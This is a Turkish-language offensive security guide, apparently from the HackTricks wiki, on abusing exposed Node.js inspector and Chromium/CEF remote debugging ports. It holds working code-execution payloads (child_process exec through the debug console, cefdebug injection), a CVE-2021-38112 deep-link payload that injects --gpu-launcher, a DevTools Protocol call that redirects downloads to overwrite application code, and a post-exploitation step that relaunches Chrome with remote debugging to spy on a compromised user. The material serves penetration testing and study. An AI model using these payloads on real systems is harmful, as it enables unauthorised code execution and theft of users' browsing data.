# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

[Belgelerden](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` anahtarı ile başlatıldığında, bir Node.js süreci bir hata ayıklama istemcisi için dinler. **Varsayılan olarak**, **`127.0.0.1:9229`** adresinde dinleyecektir. Her sürece de **benzersiz** bir **UUID** atanır.

İnspektör istemcileri, bağlanmak için host adresini, portu ve UUID'yi bilmek ve belirtmek zorundadır. Tam bir URL şu şekilde görünecektir: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> **Hata ayıklayıcı, Node.js yürütme ortamına tam erişime sahip olduğundan**, bu porta bağlanabilen kötü niyetli bir aktör, Node.js süreci adına rastgele kod çalıştırabilir (**potansiyel ayrıcalık yükseltme**).

Bir inspektörü başlatmanın birkaç yolu vardır:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Bir denetlenen işlem başlattığınızda, şöyle bir şey görünecektir:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) tabanlı süreçler, **debugger**'ı açmak için `--remote-debugging-port=9222` parametresini kullanmalıdır (SSRF korumaları oldukça benzer kalır). Ancak, bir **NodeJS** **debug** oturumu vermek yerine, tarayıcı ile [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) aracılığıyla iletişim kuracaklardır; bu, tarayıcıyı kontrol etmek için bir arayüzdür, ancak doğrudan bir RCE yoktur.

Bir debug edilmiş tarayıcı başlattığınızda, şöyle bir şey görünecektir:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Tarayıcılar, WebSocket'ler ve aynı köken politikası <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Bir web tarayıcısında açılan web siteleri, tarayıcı güvenlik modeli altında WebSocket ve HTTP istekleri yapabilir. **Benzersiz bir hata ayıklayıcı oturum kimliği elde etmek** için **ilk bir HTTP bağlantısı** gereklidir. **Aynı köken politikası**, web sitelerinin **bu HTTP bağlantısını** yapmasını engeller. [**DNS yeniden bağlama saldırılarına**](https://en.wikipedia.org/wiki/DNS_rebinding)** karşı ek güvenlik** için, Node.js bağlantının **'Host' başlıklarının** ya bir **IP adresi** ya da tam olarak **`localhost`** veya **`localhost6`** belirtip belirtmediğini doğrular.

> [!NOTE]
> Bu **güvenlik önlemleri, sadece bir HTTP isteği göndererek** kod çalıştırmak için **denetleyiciyi istismar etmeyi** engeller (bu, bir SSRF açığını istismar ederek yapılabilir).

### Çalışan süreçlerde denetleyiciyi başlatma

Çalışan bir nodejs sürecine **SIGUSR1 sinyalini** göndererek, **denetleyiciyi** varsayılan portta başlatabilirsiniz. Ancak, yeterli ayrıcalıklara sahip olmanız gerektiğini unutmayın, bu nedenle bu, size **süreç içindeki bilgilere ayrıcalıklı erişim** sağlayabilir ancak doğrudan bir ayrıcalık yükseltmesi sağlamaz.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!NOTE]
> Bu, konteynerlerde **süreci kapatmak ve yeni bir tane başlatmak** `--inspect` ile **bir seçenek değildir** çünkü **konteyner** sürekle birlikte **öldürülecektir**.

### Denetleyiciye/hata ayıklayıcıya bağlanma

**Chromium tabanlı bir tarayıcıya** bağlanmak için, Chrome veya Edge için sırasıyla `chrome://inspect` veya `edge://inspect` URL'leri erişilebilir. Yapılandırma düğmesine tıklanarak **hedef ana bilgisayar ve port** bilgilerin doğru listelendiğinden emin olunmalıdır. Görüntü, Uzaktan Kod Yürütme (RCE) örneğini göstermektedir:

![](<../../images/image (674).png>)

**Komut satırı** kullanarak bir hata ayıklayıcıya/denetleyiciye şu şekilde bağlanabilirsiniz:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Araç [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), yerel olarak çalışan **denetleyicileri bulmayı** ve onlara **kod enjekte etmeyi** sağlar.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!NOTE]
> **NodeJS RCE istismarları**, [**Chrome DevTools Protokolü**](https://chromedevtools.github.io/devtools-protocol/) aracılığıyla bir tarayıcıya bağlı olduğunda **çalışmayacaktır** (bununla ilgili ilginç şeyler bulmak için API'yi kontrol etmeniz gerekir).

## NodeJS Hata Ayıklayıcı/Denetleyici'de RCE

> [!NOTE]
> Eğer buraya [**Electron'da bir XSS'den RCE nasıl alınır**] (../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html) diye bakmak için geldiyseniz, lütfen bu sayfayı kontrol edin.

Node **denetleyici** ile **bağlandığınızda** **RCE** elde etmenin bazı yaygın yolları, (bu **Chrome DevTools protokolüne bağlantıda çalışmayacak gibi görünüyor**) bir şey kullanmaktır:
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

API'yi burada kontrol edebilirsiniz: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Bu bölümde, insanların bu protokolü istismar etmek için kullandığı ilginç şeyleri listeleyeceğim.

### Derin Bağlantılar Üzerinden Parametre Enjeksiyonu

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino güvenliği, CEF tabanlı bir uygulamanın sistemde **özel bir URI** (workspaces://index.html) kaydettiğini ve tam URI'yi alarak **CEF tabanlı uygulamayı** bu URI'den kısmen yapılandırılmış bir konfigürasyonla başlattığını keşfetti.

URI parametrelerinin URL çözümlemesi yapılarak CEF temel uygulamasını başlatmak için kullanıldığı ve bir kullanıcının **komut satırında** **`--gpu-launcher`** bayrağını **enjekte** etmesine ve rastgele şeyler çalıştırmasına olanak tanıdığı keşfedildi.

Yani, şöyle bir yük:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exe'yi çalıştıracak.

### Dosyaları Üzerine Yaz

**İndirilen dosyaların kaydedileceği** klasörü değiştirin ve bir dosya indirerek uygulamanın sık kullanılan **kaynak kodunu** **kötü niyetli kodunuzla** **üzerine yazın**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE ve exfiltrasyon

Bu gönderiye göre: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) RCE elde etmek ve iç sayfaları theriver'dan exfiltre etmek mümkündür.

### Post-Exploitation

Gerçek bir ortamda ve **bir kullanıcı PC'sini ele geçirdikten sonra** Chrome/Chromium tabanlı bir tarayıcı kullanan bir kullanıcıyı ele geçirdiğinizde, **hata ayıklama etkinleştirilmiş ve hata ayıklama portunu yönlendirilmiş** bir Chrome süreci başlatabilirsiniz. Bu şekilde, **kurbanın Chrome ile yaptığı her şeyi inceleyebilir ve hassas bilgileri çalabilirsiniz**.

Gizli yol, **her Chrome sürecini sonlandırmak** ve ardından şöyle bir şey çağırmaktır:
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referanslar

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
